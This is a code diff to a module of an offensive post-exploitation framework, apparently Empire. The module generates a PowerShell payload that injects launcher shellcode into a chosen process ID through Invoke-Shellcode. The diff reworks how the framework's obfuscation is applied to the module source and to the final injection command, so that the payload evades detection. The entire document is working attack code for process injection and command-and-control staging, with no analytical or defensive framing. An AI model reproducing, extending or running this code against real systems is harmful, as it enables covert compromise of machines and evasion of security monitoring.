@@ -1,5 +1,6 @@
 from __future__ import print_function
 
+import pathlib
 from builtins import object
 from builtins import str
 from typing import Dict
@@ -22,21 +23,23 @@ class Module(object):
         arch = params['Arch']
 
         module_source = main_menu.installPath + "/data/module_source/code_execution/Invoke-Shellcode.ps1"
-        if obfuscate:
-            data_util.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscation_command)
-            module_source = module_source.replace("module_source", "obfuscated_module_source")
+        if main_menu.obfuscate:
+            obfuscated_module_source = module_source.replace("module_source", "obfuscated_module_source")
+            if pathlib.Path(obfuscated_module_source).is_file():
+                module_source = obfuscated_module_source
+
         try:
-            f = open(module_source, 'r')
+            with open(module_source, 'r') as f:
+                module_code = f.read()
         except:
             return handle_error_message("[!] Could not read module source path at: " + str(module_source))
 
-        module_code = f.read()
-        f.close()
+        if main_menu.obfuscate and not pathlib.Path(obfuscated_module_source).is_file():
+            script = data_util.obfuscate(installPath=main_menu.installPath, psScript=module_code,
+                                         obfuscationCommand=main_menu.obfuscateCommand)
+        else:
+            script = module_code
 
-        # If you'd just like to import a subset of the functions from the
-        #   module source, use the following:
-        #   script = helpers.generate_dynamic_powershell_script(moduleCode, ["Get-Something", "Set-Something"])
-        script = module_code
         script_end = "; shellcode injected into pid {}".format(str(proc_id))
 
         if not main_menu.listeners.is_listener_valid(listener_name):
@@ -51,18 +54,13 @@ class Module(object):
                 return handle_error_message('[!] Error in launcher generation.')
             else:
                 launcher_code = launcher.split(' ')[-1]
-
                 sc = main_menu.stagers.generate_powershell_shellcode(launcher_code, arch)
-
                 encoded_sc = helpers.encode_base64(sc)
 
-        # Add any arguments to the end execution of the script
+        script_1 = "\nInvoke-Shellcode -ProcessID {} -Shellcode $([Convert]::FromBase64String(\"{}\")) -Force".format(proc_id, encoded_sc)
 
-        # t = iter(sc)
-        # pow_array = ',0x'.join(a+b for a,b in zip(t, t))
-        # pow_array = "@(0x" + pow_array + " )"
-        script += "\nInvoke-Shellcode -ProcessID {} -Shellcode $([Convert]::FromBase64String(\"{}\")) -Force".format(
-            proc_id, encoded_sc)
+        if main_menu.obfuscate:
+            script_end = data_util.obfuscate(main_menu.installPath, psScript=script_1+script_end, obfuscationCommand=main_menu.obfuscateCommand)
         script += script_end
         script = data_util.keyword_obfuscation(script)
 
